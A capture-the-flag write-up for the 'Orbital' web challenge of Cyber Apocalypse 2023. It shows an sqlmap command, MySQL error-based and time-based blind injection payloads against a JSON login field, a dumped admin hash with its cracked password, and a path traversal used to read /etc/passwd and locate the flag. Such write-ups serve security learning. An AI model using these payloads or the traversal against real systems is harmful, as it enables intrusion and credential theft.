---
layout: load_md
title: The White Circle | Cyber Apocalypse 2023 | Orbital Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2023
parent: cyber_apocalypse_2023
category: web
challenge: Orbital
tags: "web, legend, sql, sqli, sqlmap, lfi"
date: 2023-03-27T00:00:00+00:00
last_modified_at: 2023-03-27T00:00:00+00:00
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2023</h1>

## Orbital
> Solved by Legend

Challenge description


> In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?

In this challenge also a login page is their.

![](https://i.imgur.com/ak8NBt8.png)


And with no user info or details in source code I checked the docker files.

This challenge is similar to the `Drobots` challenge. It’s running `Flask` application with `MySQL`. So I looked into the docker file.

The `config.py` contains the database config info.

![](https://i.imgur.com/taRJF8c.png)


And `database.py` contain the database logic along with the hint but it is modified a little.
This time the `password` is getting verified with `passwordVerify`.

![](https://i.imgur.com/B5AErEg.png)


I again saved the request and gave it to `sqlmap`  which gave me the token and also bruteforced the password.


    sqlmap -r ./req --dbms=mysql -D orbital -T users --dump


    ---
    Parameter: JSON username ((custom) POST)
        Type: error-based
        Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
        Payload: {"username":"a"="a" AND (SELECT 2720 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(2720=2720,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "a"="a","password":"a"}
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: {"username":"a"="a" AND (SELECT 1000 FROM (SELECT(SLEEP(5)))dfxy) AND "a"="a","password":"a"}
    ---


    +----+-------------------------------------------------+----------+
    | id | password                                        | username |
    +----+-------------------------------------------------+----------+
    | 1  | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin    |
    +----+-------------------------------------------------+----------+

Now once logged in the functionality of the website was different.

![](https://i.imgur.com/tDoI12L.png)


Now I checked the `routes.py` file which contained a logic of the application. Here in the logic of communication the hint was given that the file escape for characters are not there for the filename. 

![](https://i.imgur.com/zFxOjWB.png)


Then I tried the path traversal to get the `/etc/passwd` file. It worked. 

![](https://i.imgur.com/yh8DtGq.png)


For this challenge they changed the location of the flag name from `flag.txt` to `signal_sleuth_firmware` in root which is written in the docker config.


    COPY flag.txt /signal_sleuth_firmware

Now we need to get the flag.

![](https://i.imgur.com/BFlcwv3.png)

